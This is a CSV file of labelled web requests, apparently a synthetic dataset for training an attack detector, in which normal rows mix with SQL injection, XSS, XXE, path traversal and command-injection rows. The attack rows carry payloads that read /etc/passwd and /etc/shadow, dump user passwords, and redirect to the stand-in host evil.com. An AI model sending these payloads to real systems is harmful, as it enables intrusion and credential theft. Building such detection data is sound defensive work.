attack_type,payload,endpoint,http_method,request_body,source_ip
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/admin/application-configuration,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.231
normal,search=apple,/rest/user/login,POST,search=apple,192.168.1.29
normal,search=apple,/api/Products,POST,search=apple,192.168.1.12
lfi,../../../../etc/passwd,/rest/admin/application-configuration,POST,../../../../etc/passwd,192.168.1.246
normal,product=1,/api/Products,POST,product=1,192.168.1.147
xss,<script>document.location='http://evil.com'</script>,/rest/user/login,POST,<script>document.location='http://evil.com'</script>,192.168.1.79
normal,sort=price,/redirect,POST,sort=price,192.168.1.168
normal,page=1,/ftp,GET,page=1,192.168.1.108
sqli,' OR '1'='1' --,/rest/admin/application-configuration,GET,' OR '1'='1' --,192.168.1.111
normal,sort=price,/rest/user/login,GET,sort=price,192.168.1.10
sqli,"' UNION SELECT username, password FROM Users--",/ftp,POST,"' UNION SELECT username, password FROM Users--",192.168.1.69
normal,search=apple,/rest/admin/application-configuration,GET,search=apple,192.168.1.141
normal,email=user@test.com,/api/Products,GET,email=user@test.com,192.168.1.12
xss,<script>document.location='http://evil.com'</script>,/profile,POST,<script>document.location='http://evil.com'</script>,192.168.1.128
normal,search=apple,/rest/basket,GET,search=apple,192.168.1.105
sqli,' OR '1'='1' --,/rest/admin/application-configuration,POST,' OR '1'='1' --,192.168.1.122
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/#/search,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.206
normal,product=1,/api/Products,POST,product=1,192.168.1.234
normal,page=1,/rest/basket,POST,page=1,192.168.1.173
rce,; cat /etc/shadow,/#/search,POST,; cat /etc/shadow,192.168.1.47
normal,page=1,/profile,POST,page=1,192.168.1.181
rce,; cat /etc/shadow,/rest/basket,POST,; cat /etc/shadow,192.168.1.236
normal,search=apple,/ftp,POST,search=apple,192.168.1.243
normal,product=1,/api/Products,GET,product=1,192.168.1.187
normal,category=juice,/profile,POST,category=juice,192.168.1.166
xss,<script>document.location='http://evil.com'</script>,/api/Products,POST,<script>document.location='http://evil.com'</script>,192.168.1.28
xss,<img src=x onerror=alert(1)>,/rest/admin/application-configuration,GET,<img src=x onerror=alert(1)>,192.168.1.95
normal,product=1,/redirect,GET,product=1,192.168.1.238
lfi,../../../../etc/passwd,/redirect,POST,../../../../etc/passwd,192.168.1.179
sqli,' OR '1'='1' --,/ftp,POST,' OR '1'='1' --,192.168.1.141
normal,category=juice,/rest/user/login,GET,category=juice,192.168.1.195
normal,search=apple,/#/search,POST,search=apple,192.168.1.100
normal,category=juice,/ftp,GET,category=juice,192.168.1.164
rce,| ls -la /,/api/Products,POST,| ls -la /,192.168.1.26
normal,sort=price,/ftp,POST,sort=price,192.168.1.33
normal,email=user@test.com,/profile,GET,email=user@test.com,192.168.1.207
normal,page=1,/rest/basket,POST,page=1,192.168.1.16
normal,category=juice,/rest/user/login,POST,category=juice,192.168.1.195
normal,email=user@test.com,/rest/basket,GET,email=user@test.com,192.168.1.203
normal,search=apple,/redirect,POST,search=apple,192.168.1.239
normal,search=apple,/redirect,POST,search=apple,192.168.1.61
xss,<img src=x onerror=alert(1)>,/profile,POST,<img src=x onerror=alert(1)>,192.168.1.46
sqli,' OR '1'='1' --,/redirect,POST,' OR '1'='1' --,192.168.1.150
normal,category=juice,/rest/user/login,POST,category=juice,192.168.1.224
rce,; cat /etc/shadow,/ftp,GET,; cat /etc/shadow,192.168.1.66
normal,category=juice,/profile,POST,category=juice,192.168.1.125
xss,<img src=x onerror=alert(1)>,/rest/user/login,GET,<img src=x onerror=alert(1)>,192.168.1.235
normal,email=user@test.com,/api/Products,POST,email=user@test.com,192.168.1.167
normal,category=juice,/ftp,POST,category=juice,192.168.1.127
normal,search=apple,/rest/basket,GET,search=apple,192.168.1.250
normal,email=user@test.com,/ftp,POST,email=user@test.com,192.168.1.117
normal,product=1,/redirect,POST,product=1,192.168.1.68
sqli,"' UNION SELECT username, password FROM Users--",/rest/user/login,GET,"' UNION SELECT username, password FROM Users--",192.168.1.245
normal,search=apple,/redirect,GET,search=apple,192.168.1.143
normal,product=1,/profile,POST,product=1,192.168.1.65
normal,sort=price,/ftp,GET,sort=price,192.168.1.132
rce,; cat /etc/shadow,/api/Products,POST,; cat /etc/shadow,192.168.1.113
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/#/search,GET,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.8
xss,<img src=x onerror=alert(1)>,/rest/admin/application-configuration,POST,<img src=x onerror=alert(1)>,192.168.1.161
rce,| ls -la /,/rest/admin/application-configuration,POST,| ls -la /,192.168.1.252
xss,<script>document.location='http://evil.com'</script>,/ftp,GET,<script>document.location='http://evil.com'</script>,192.168.1.27
xss,<script>document.location='http://evil.com'</script>,/#/search,POST,<script>document.location='http://evil.com'</script>,192.168.1.189
normal,product=1,/redirect,GET,product=1,192.168.1.142
normal,email=user@test.com,/ftp,GET,email=user@test.com,192.168.1.44
normal,sort=price,/api/Products,POST,sort=price,192.168.1.111
normal,email=user@test.com,/redirect,POST,email=user@test.com,192.168.1.47
xss,<img src=x onerror=alert(1)>,/profile,POST,<img src=x onerror=alert(1)>,192.168.1.92
normal,page=1,/api/Products,GET,page=1,192.168.1.30
normal,email=user@test.com,/rest/admin/application-configuration,POST,email=user@test.com,192.168.1.184
sqli,"' UNION SELECT username, password FROM Users--",/rest/admin/application-configuration,GET,"' UNION SELECT username, password FROM Users--",192.168.1.155
xss,<script>document.location='http://evil.com'</script>,/api/Products,POST,<script>document.location='http://evil.com'</script>,192.168.1.214
rce,; cat /etc/shadow,/redirect,POST,; cat /etc/shadow,192.168.1.50
normal,page=1,/profile,POST,page=1,192.168.1.203
rce,| ls -la /,/api/Products,GET,| ls -la /,192.168.1.237
xss,<script>document.location='http://evil.com'</script>,/profile,GET,<script>document.location='http://evil.com'</script>,192.168.1.46
normal,email=user@test.com,/rest/admin/application-configuration,GET,email=user@test.com,192.168.1.222
normal,search=apple,/#/search,GET,search=apple,192.168.1.214
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/profile,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.44
sqli,"' UNION SELECT username, password FROM Users--",/#/search,GET,"' UNION SELECT username, password FROM Users--",192.168.1.37
normal,category=juice,/rest/basket,GET,category=juice,192.168.1.83
rce,| ls -la /,/profile,GET,| ls -la /,192.168.1.72
normal,sort=price,/api/Products,POST,sort=price,192.168.1.251
xss,<script>document.location='http://evil.com'</script>,/redirect,GET,<script>document.location='http://evil.com'</script>,192.168.1.114
rce,; cat /etc/shadow,/rest/user/login,GET,; cat /etc/shadow,192.168.1.86
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/rest/admin/application-configuration,POST,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.140
normal,category=juice,/rest/admin/application-configuration,GET,category=juice,192.168.1.34
xss,<img src=x onerror=alert(1)>,/redirect,GET,<img src=x onerror=alert(1)>,192.168.1.108
normal,sort=price,/ftp,POST,sort=price,192.168.1.77
normal,sort=price,/#/search,GET,sort=price,192.168.1.158
normal,sort=price,/ftp,POST,sort=price,192.168.1.150
lfi,../../../../etc/passwd,/rest/basket,GET,../../../../etc/passwd,192.168.1.21
sqli,"' UNION SELECT username, password FROM Users--",/redirect,POST,"' UNION SELECT username, password FROM Users--",192.168.1.69
rce,; cat /etc/shadow,/ftp,GET,; cat /etc/shadow,192.168.1.71
normal,sort=price,/api/Products,POST,sort=price,192.168.1.154
normal,page=1,/rest/basket,GET,page=1,192.168.1.34
sqli,' OR '1'='1' --,/rest/user/login,POST,' OR '1'='1' --,192.168.1.205
normal,product=1,/ftp,POST,product=1,192.168.1.55
xss,<img src=x onerror=alert(1)>,/redirect,GET,<img src=x onerror=alert(1)>,192.168.1.235
normal,sort=price,/rest/admin/application-configuration,POST,sort=price,192.168.1.68
sqli,"' UNION SELECT username, password FROM Users--",/profile,POST,"' UNION SELECT username, password FROM Users--",192.168.1.137
rce,| ls -la /,/profile,POST,| ls -la /,192.168.1.233
normal,product=1,/#/search,POST,product=1,192.168.1.66
sqli,' OR '1'='1' --,/profile,GET,' OR '1'='1' --,192.168.1.161
normal,sort=price,/rest/user/login,GET,sort=price,192.168.1.49
xss,<img src=x onerror=alert(1)>,/profile,GET,<img src=x onerror=alert(1)>,192.168.1.206
normal,sort=price,/#/search,POST,sort=price,192.168.1.54
normal,product=1,/ftp,GET,product=1,192.168.1.48
normal,category=juice,/redirect,GET,category=juice,192.168.1.83
sqli,' OR '1'='1' --,/api/Products,GET,' OR '1'='1' --,192.168.1.60
normal,sort=price,/api/Products,POST,sort=price,192.168.1.117
normal,page=1,/ftp,GET,page=1,192.168.1.149
xss,<img src=x onerror=alert(1)>,/#/search,GET,<img src=x onerror=alert(1)>,192.168.1.102
normal,category=juice,/#/search,POST,category=juice,192.168.1.134
lfi,../../../../etc/passwd,/api/Products,GET,../../../../etc/passwd,192.168.1.230
rce,; cat /etc/shadow,/api/Products,POST,; cat /etc/shadow,192.168.1.16
normal,search=apple,/redirect,GET,search=apple,192.168.1.242
normal,product=1,/rest/basket,GET,product=1,192.168.1.38
normal,sort=price,/ftp,GET,sort=price,192.168.1.93
xss,<img src=x onerror=alert(1)>,/api/Products,POST,<img src=x onerror=alert(1)>,192.168.1.90
rce,; cat /etc/shadow,/rest/admin/application-configuration,GET,; cat /etc/shadow,192.168.1.26
normal,search=apple,/#/search,GET,search=apple,192.168.1.99
sqli,' OR '1'='1' --,/#/search,POST,' OR '1'='1' --,192.168.1.18
normal,sort=price,/rest/basket,GET,sort=price,192.168.1.24
rce,; cat /etc/shadow,/ftp,GET,; cat /etc/shadow,192.168.1.121
xss,<img src=x onerror=alert(1)>,/ftp,POST,<img src=x onerror=alert(1)>,192.168.1.124
xss,<img src=x onerror=alert(1)>,/redirect,GET,<img src=x onerror=alert(1)>,192.168.1.126
normal,category=juice,/rest/user/login,POST,category=juice,192.168.1.152
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/ftp,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.77
normal,email=user@test.com,/rest/user/login,POST,email=user@test.com,192.168.1.138
normal,product=1,/rest/user/login,POST,product=1,192.168.1.246
normal,product=1,/rest/basket,POST,product=1,192.168.1.70
rce,| ls -la /,/#/search,GET,| ls -la /,192.168.1.240
normal,sort=price,/rest/user/login,POST,sort=price,192.168.1.193
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/user/login,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.100
xss,<img src=x onerror=alert(1)>,/ftp,POST,<img src=x onerror=alert(1)>,192.168.1.51
rce,| ls -la /,/rest/basket,POST,| ls -la /,192.168.1.230
xss,<img src=x onerror=alert(1)>,/rest/user/login,POST,<img src=x onerror=alert(1)>,192.168.1.166
sqli,"' UNION SELECT username, password FROM Users--",/rest/admin/application-configuration,POST,"' UNION SELECT username, password FROM Users--",192.168.1.221
normal,sort=price,/#/search,GET,sort=price,192.168.1.148
normal,search=apple,/rest/basket,GET,search=apple,192.168.1.243
normal,page=1,/rest/user/login,GET,page=1,192.168.1.125
rce,; cat /etc/shadow,/#/search,GET,; cat /etc/shadow,192.168.1.86
lfi,../../../../etc/passwd,/rest/user/login,GET,../../../../etc/passwd,192.168.1.209
normal,page=1,/rest/admin/application-configuration,POST,page=1,192.168.1.159
normal,sort=price,/rest/admin/application-configuration,POST,sort=price,192.168.1.154
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/user/login,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.188
lfi,../../../../etc/passwd,/profile,POST,../../../../etc/passwd,192.168.1.92
normal,product=1,/profile,POST,product=1,192.168.1.143
sqli,"' UNION SELECT username, password FROM Users--",/redirect,GET,"' UNION SELECT username, password FROM Users--",192.168.1.4
normal,email=user@test.com,/api/Products,GET,email=user@test.com,192.168.1.238
normal,product=1,/profile,POST,product=1,192.168.1.124
normal,product=1,/rest/user/login,GET,product=1,192.168.1.247
normal,product=1,/ftp,GET,product=1,192.168.1.92
normal,product=1,/rest/user/login,POST,product=1,192.168.1.66
normal,product=1,/rest/admin/application-configuration,POST,product=1,192.168.1.120
xss,<script>document.location='http://evil.com'</script>,/api/Products,GET,<script>document.location='http://evil.com'</script>,192.168.1.103
normal,category=juice,/ftp,GET,category=juice,192.168.1.104
normal,search=apple,/api/Products,GET,search=apple,192.168.1.254
sqli,"' UNION SELECT username, password FROM Users--",/rest/user/login,POST,"' UNION SELECT username, password FROM Users--",192.168.1.66
normal,product=1,/profile,POST,product=1,192.168.1.184
normal,sort=price,/rest/admin/application-configuration,POST,sort=price,192.168.1.196
normal,page=1,/api/Products,GET,page=1,192.168.1.106
normal,sort=price,/#/search,GET,sort=price,192.168.1.67
sqli,"' UNION SELECT username, password FROM Users--",/rest/admin/application-configuration,POST,"' UNION SELECT username, password FROM Users--",192.168.1.239
normal,email=user@test.com,/ftp,POST,email=user@test.com,192.168.1.25
rce,| ls -la /,/profile,GET,| ls -la /,192.168.1.156
normal,page=1,/ftp,POST,page=1,192.168.1.142
normal,search=apple,/rest/admin/application-configuration,GET,search=apple,192.168.1.35
normal,product=1,/rest/admin/application-configuration,POST,product=1,192.168.1.203
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/#/search,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.181
normal,category=juice,/#/search,POST,category=juice,192.168.1.54
normal,category=juice,/rest/admin/application-configuration,GET,category=juice,192.168.1.153
normal,category=juice,/ftp,GET,category=juice,192.168.1.120
normal,page=1,/rest/basket,GET,page=1,192.168.1.52
normal,sort=price,/rest/admin/application-configuration,POST,sort=price,192.168.1.6
normal,email=user@test.com,/profile,GET,email=user@test.com,192.168.1.32
sqli,"' UNION SELECT username, password FROM Users--",/#/search,GET,"' UNION SELECT username, password FROM Users--",192.168.1.20
normal,category=juice,/redirect,GET,category=juice,192.168.1.148
normal,search=apple,/#/search,GET,search=apple,192.168.1.117
normal,product=1,/profile,POST,product=1,192.168.1.124
normal,product=1,/rest/admin/application-configuration,POST,product=1,192.168.1.246
normal,search=apple,/profile,POST,search=apple,192.168.1.168
xss,<script>document.location='http://evil.com'</script>,/ftp,POST,<script>document.location='http://evil.com'</script>,192.168.1.73
rce,; cat /etc/shadow,/profile,GET,; cat /etc/shadow,192.168.1.186
normal,page=1,/api/Products,GET,page=1,192.168.1.240
rce,| ls -la /,/rest/user/login,GET,| ls -la /,192.168.1.51
lfi,../../../../etc/passwd,/#/search,POST,../../../../etc/passwd,192.168.1.175
normal,page=1,/rest/basket,GET,page=1,192.168.1.74
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/basket,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.179
normal,page=1,/api/Products,POST,page=1,192.168.1.156
normal,product=1,/rest/basket,GET,product=1,192.168.1.54
normal,email=user@test.com,/ftp,POST,email=user@test.com,192.168.1.89
normal,page=1,/#/search,GET,page=1,192.168.1.27
normal,sort=price,/redirect,GET,sort=price,192.168.1.195
rce,; cat /etc/shadow,/rest/admin/application-configuration,GET,; cat /etc/shadow,192.168.1.125
normal,category=juice,/api/Products,POST,category=juice,192.168.1.135
normal,email=user@test.com,/rest/basket,GET,email=user@test.com,192.168.1.244
normal,email=user@test.com,/rest/user/login,GET,email=user@test.com,192.168.1.214
normal,page=1,/#/search,GET,page=1,192.168.1.39
normal,sort=price,/redirect,GET,sort=price,192.168.1.18
xss,<script>document.location='http://evil.com'</script>,/rest/admin/application-configuration,GET,<script>document.location='http://evil.com'</script>,192.168.1.228
normal,page=1,/rest/admin/application-configuration,POST,page=1,192.168.1.221
normal,category=juice,/#/search,POST,category=juice,192.168.1.60
normal,page=1,/profile,GET,page=1,192.168.1.253
normal,category=juice,/profile,POST,category=juice,192.168.1.86
normal,product=1,/ftp,POST,product=1,192.168.1.210
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/#/search,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.86
normal,product=1,/api/Products,GET,product=1,192.168.1.231
normal,category=juice,/rest/admin/application-configuration,POST,category=juice,192.168.1.78
sqli,' OR '1'='1' --,/rest/admin/application-configuration,GET,' OR '1'='1' --,192.168.1.161
lfi,../../../../etc/passwd,/redirect,POST,../../../../etc/passwd,192.168.1.173
normal,email=user@test.com,/rest/user/login,POST,email=user@test.com,192.168.1.21
normal,sort=price,/rest/admin/application-configuration,GET,sort=price,192.168.1.70
rce,| ls -la /,/redirect,GET,| ls -la /,192.168.1.184
rce,; cat /etc/shadow,/#/search,POST,; cat /etc/shadow,192.168.1.89
normal,category=juice,/redirect,GET,category=juice,192.168.1.172
lfi,../../../../etc/passwd,/#/search,GET,../../../../etc/passwd,192.168.1.168
rce,; cat /etc/shadow,/api/Products,POST,; cat /etc/shadow,192.168.1.51
normal,search=apple,/api/Products,POST,search=apple,192.168.1.86
rce,| ls -la /,/ftp,GET,| ls -la /,192.168.1.28
rce,; cat /etc/shadow,/rest/basket,POST,; cat /etc/shadow,192.168.1.102
sqli,' OR '1'='1' --,/rest/basket,GET,' OR '1'='1' --,192.168.1.91
sqli,' OR '1'='1' --,/ftp,GET,' OR '1'='1' --,192.168.1.102
normal,search=apple,/ftp,POST,search=apple,192.168.1.222
xss,<img src=x onerror=alert(1)>,/rest/admin/application-configuration,POST,<img src=x onerror=alert(1)>,192.168.1.110
normal,search=apple,/api/Products,POST,search=apple,192.168.1.33
normal,search=apple,/api/Products,POST,search=apple,192.168.1.48
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/ftp,GET,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.55
normal,category=juice,/rest/basket,POST,category=juice,192.168.1.154
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/admin/application-configuration,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.15
normal,category=juice,/api/Products,GET,category=juice,192.168.1.236
normal,product=1,/rest/user/login,POST,product=1,192.168.1.93
normal,search=apple,/rest/user/login,POST,search=apple,192.168.1.242
normal,product=1,/#/search,GET,product=1,192.168.1.98
normal,email=user@test.com,/#/search,GET,email=user@test.com,192.168.1.59
normal,product=1,/rest/admin/application-configuration,POST,product=1,192.168.1.207
normal,search=apple,/redirect,POST,search=apple,192.168.1.184
normal,product=1,/ftp,GET,product=1,192.168.1.131
sqli,"' UNION SELECT username, password FROM Users--",/api/Products,POST,"' UNION SELECT username, password FROM Users--",192.168.1.179
normal,category=juice,/profile,GET,category=juice,192.168.1.233
normal,sort=price,/rest/user/login,POST,sort=price,192.168.1.71
normal,category=juice,/ftp,GET,category=juice,192.168.1.163
normal,email=user@test.com,/rest/basket,GET,email=user@test.com,192.168.1.184
normal,category=juice,/redirect,POST,category=juice,192.168.1.154
lfi,../../../../etc/passwd,/redirect,GET,../../../../etc/passwd,192.168.1.112
sqli,"' UNION SELECT username, password FROM Users--",/rest/admin/application-configuration,POST,"' UNION SELECT username, password FROM Users--",192.168.1.225
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/admin/application-configuration,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.223
lfi,../../../../etc/passwd,/redirect,POST,../../../../etc/passwd,192.168.1.52
normal,sort=price,/ftp,POST,sort=price,192.168.1.77
rce,| ls -la /,/api/Products,POST,| ls -la /,192.168.1.27
normal,product=1,/ftp,POST,product=1,192.168.1.78
rce,| ls -la /,/api/Products,POST,| ls -la /,192.168.1.189
normal,page=1,/rest/user/login,GET,page=1,192.168.1.247
normal,sort=price,/api/Products,POST,sort=price,192.168.1.54
rce,| ls -la /,/ftp,GET,| ls -la /,192.168.1.11
normal,page=1,/rest/admin/application-configuration,POST,page=1,192.168.1.148
normal,product=1,/profile,POST,product=1,192.168.1.142
rce,; cat /etc/shadow,/rest/basket,GET,; cat /etc/shadow,192.168.1.55
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/profile,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.188
normal,page=1,/api/Products,POST,page=1,192.168.1.52
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/profile,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.130
normal,category=juice,/redirect,POST,category=juice,192.168.1.99
rce,; cat /etc/shadow,/profile,GET,; cat /etc/shadow,192.168.1.30
sqli,' OR '1'='1' --,/profile,POST,' OR '1'='1' --,192.168.1.214
normal,product=1,/api/Products,POST,product=1,192.168.1.157
normal,sort=price,/rest/user/login,GET,sort=price,192.168.1.205
rce,; cat /etc/shadow,/api/Products,POST,; cat /etc/shadow,192.168.1.248
normal,search=apple,/rest/user/login,GET,search=apple,192.168.1.159
normal,page=1,/rest/user/login,GET,page=1,192.168.1.233
xss,<script>document.location='http://evil.com'</script>,/ftp,GET,<script>document.location='http://evil.com'</script>,192.168.1.54
sqli,' OR '1'='1' --,/rest/admin/application-configuration,GET,' OR '1'='1' --,192.168.1.221
xss,<img src=x onerror=alert(1)>,/#/search,GET,<img src=x onerror=alert(1)>,192.168.1.185
normal,category=juice,/rest/admin/application-configuration,POST,category=juice,192.168.1.227
rce,| ls -la /,/rest/user/login,GET,| ls -la /,192.168.1.100
normal,search=apple,/rest/basket,GET,search=apple,192.168.1.103
normal,email=user@test.com,/rest/admin/application-configuration,GET,email=user@test.com,192.168.1.159
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/rest/user/login,POST,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.42
xss,<img src=x onerror=alert(1)>,/rest/basket,POST,<img src=x onerror=alert(1)>,192.168.1.146
normal,email=user@test.com,/rest/basket,GET,email=user@test.com,192.168.1.254
normal,sort=price,/profile,GET,sort=price,192.168.1.56
normal,category=juice,/rest/admin/application-configuration,GET,category=juice,192.168.1.35
rce,| ls -la /,/redirect,GET,| ls -la /,192.168.1.88
normal,page=1,/ftp,GET,page=1,192.168.1.31
normal,sort=price,/api/Products,GET,sort=price,192.168.1.114
rce,| ls -la /,/rest/admin/application-configuration,GET,| ls -la /,192.168.1.73
xss,<img src=x onerror=alert(1)>,/rest/admin/application-configuration,POST,<img src=x onerror=alert(1)>,192.168.1.25
normal,category=juice,/ftp,POST,category=juice,192.168.1.251
xxe,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/res",/profile,GET,"<?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/read=convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",192.168.1.158
normal,sort=price,/redirect,GET,sort=price,192.168.1.154
sqli,' OR '1'='1' --,/#/search,GET,' OR '1'='1' --,192.168.1.220
xss,<script>document.location='http://evil.com'</script>,/ftp,GET,<script>document.location='http://evil.com'</script>,192.168.1.73
normal,page=1,/ftp,GET,page=1,192.168.1.168
normal,page=1,/#/search,GET,page=1,192.168.1.75
normal,email=user@test.com,/rest/admin/application-configuration,GET,email=user@test.com,192.168.1.199
normal,search=apple,/rest/user/login,POST,search=apple,192.168.1.74
normal,sort=price,/rest/basket,GET,sort=price,192.168.1.156
normal,email=user@test.com,/rest/user/login,POST,email=user@test.com,192.168.1.77
normal,search=apple,/rest/admin/application-configuration,POST,search=apple,192.168.1.121
xss,<script>document.location='http://evil.com'</script>,/profile,POST,<script>document.location='http://evil.com'</script>,192.168.1.205
xss,<img src=x onerror=alert(1)>,/ftp,GET,<img src=x onerror=alert(1)>,192.168.1.68
normal,sort=price,/rest/user/login,GET,sort=price,192.168.1.189
normal,email=user@test.com,/rest/admin/application-configuration,GET,email=user@test.com,192.168.1.223
normal,category=juice,/rest/basket,POST,category=juice,192.168.1.107
xxe,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/user/login,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.220
normal,category=juice,/profile,POST,category=juice,192.168.1.61
normal,page=1,/rest/user/login,GET,page=1,192.168.1.31
normal,email=user@test.com,/api/Products,GET,email=user@test.com,192.168.1.252
normal,category=juice,/ftp,POST,category=juice,192.168.1.222
normal,search=apple,/#/search,GET,search=apple,192.168.1.210
normal,product=1,/#/search,POST,product=1,192.168.1.233
normal,search=apple,/rest/basket,POST,search=apple,192.168.1.228
xss,<script>document.location='http://evil.com'</script>,/profile,POST,<script>document.location='http://evil.com'</script>,192.168.1.149
normal,email=user@test.com,/rest/user/login,GET,email=user@test.com,192.168.1.101
normal,page=1,/api/Products,GET,page=1,192.168.1.240
normal,sort=price,/ftp,POST,sort=price,192.168.1.220
